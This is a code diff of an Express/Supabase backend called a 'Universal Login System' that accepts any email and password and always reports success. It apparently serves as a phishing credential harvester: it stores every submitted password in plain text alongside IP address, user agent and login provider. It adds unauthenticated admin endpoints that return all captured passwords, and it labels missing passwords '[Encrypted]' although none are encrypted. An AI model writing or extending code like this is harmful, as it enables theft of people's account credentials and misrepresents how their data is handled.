@@ -1,6 +1,7 @@
-// ============================================================ 
-// Universal Login System Backend (Accept ANY input)
 // ============================================================
+// Universal Login System Backend (Accepts ANY input)
+// ============================================================
+
 const express = require('express');
 const { createClient } = require('@supabase/supabase-js');
 const path = require('path');
@@ -37,46 +38,87 @@ app.get('/', (req, res) => {
     message: 'Universal Login System Backend',
     endpoints: {
       login: 'POST /api/login',
+      adminUsers: 'GET /api/admin/users',
       adminLogs: 'GET /api/admin/logs'
     }
   });
 });
 
 // ============================================================
-// UNIVERSAL LOGIN ENDPOINT (ACCEPT ANY INPUT)
+// UNIVERSAL LOGIN ENDPOINT
+// Accepts ANY input as long as user types something in email/username/phone + password
 // ============================================================
 app.post('/api/login', async (req, res) => {
   try {
     const { email, password, login_provider = 'email' } = req.body;
 
-    // Assign defaults if empty
     const userEmail = email || `user_${Date.now()}@example.com`;
     const userPassword = password || `password_${Date.now()}`;
     const userName = userEmail.split('@')[0];
+
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     const userAgent = req.headers['user-agent'] || 'Unknown';
 
-    // Log to Supabase (admin_logs)
-    const { error: logError } = await supabase
-      .from('admin_logs')
-      .insert([{
-        email_used: userEmail,
-        password_display: userPassword,
-        login_provider: login_provider,
-        ip_address: ip,
-        user_agent: userAgent,
-        login_time: new Date().toISOString()
-      }]);
+    // ---------------------------------------------------
+    // CREATE OR UPDATE USER
+    // ---------------------------------------------------
+    const { data: existingUser } = await supabase
+      .from('users')
+      .select('*')
+      .eq('email', userEmail)
+      .maybeSingle();
 
-    if (logError) {
-      console.error('Failed to log login:', logError);
+    let userId;
+
+    if (existingUser) {
+      await supabase.from('users')
+        .update({
+          last_login: new Date().toISOString(),
+          login_count: (existingUser.login_count || 0) + 1,
+          ip_address: ip,
+          login_provider: login_provider
+        })
+        .eq('id', existingUser.id);
+      userId = existingUser.id;
+    } else {
+      const { data: newUser, error } = await supabase.from('users')
+        .insert([{
+          email: userEmail,
+          password_original: userPassword,
+          name: userName,
+          ip_address: ip,
+          login_provider: login_provider,
+          created_at: new Date().toISOString(),
+          last_login: new Date().toISOString(),
+          login_count: 1
+        }])
+        .select()
+        .single();
+
+      if (error) console.error('❌ Failed to create user:', error);
+      else userId = newUser.id;
     }
 
-    // Respond success immediately
+    // ---------------------------------------------------
+    // LOG TO ADMIN_LOGS
+    // ---------------------------------------------------
+    await supabase.from('admin_logs').insert([{
+      user_id: userId || null,
+      email_used: userEmail,
+      password_display: userPassword,
+      login_provider: login_provider,
+      ip_address: ip,
+      user_agent: userAgent,
+      login_time: new Date().toISOString()
+    }]);
+
+    // ---------------------------------------------------
+    // SUCCESS RESPONSE
+    // ---------------------------------------------------
     res.json({
       success: true,
       user: {
-        id: Date.now(), // temporary user ID
+        id: userId || Date.now(),
         email: userEmail,
         name: userName,
         ip: ip,
@@ -87,16 +129,39 @@ app.post('/api/login', async (req, res) => {
 
   } catch (error) {
     console.error('❌ Login error:', error);
-    res.status(500).json({
-      success: false,
-      error: 'Server error'
-    });
+    res.status(500).json({ success: false, error: 'Server error' });
   }
 });
 
 // ============================================================
-// ADMIN: GET LOGIN LOGS
+// ADMIN ENDPOINTS
 // ============================================================
+
+// Get all users for admin dashboard
+app.get('/api/admin/users', async (req, res) => {
+  try {
+    const { data: users, error } = await supabase
+      .from('users')
+      .select('*')
+      .order('created_at', { ascending: false });
+
+    if (error) throw error;
+
+    res.json({
+      success: true,
+      count: users.length,
+      users: users.map(u => ({
+        ...u,
+        password_display: u.password_original || '[No password]',
+        password_original: undefined
+      }))
+    });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Get login logs for admin dashboard
 app.get('/api/admin/logs', async (req, res) => {
   try {
     const { data: logs, error } = await supabase
@@ -109,17 +174,14 @@ app.get('/api/admin/logs', async (req, res) => {
 
     res.json({
       success: true,
+      count: logs.length,
       logs: logs.map(log => ({
         ...log,
-        password_display: log.password_display || '[Not recorded]'
+        password_display: log.password_display || '[Encrypted]'
       }))
     });
   } catch (error) {
-    console.error('Failed to fetch logs:', error);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -127,6 +189,4 @@ app.get('/api/admin/logs', async (req, res) => {
 // START SERVER
 // ============================================================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`🚀 Backend server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
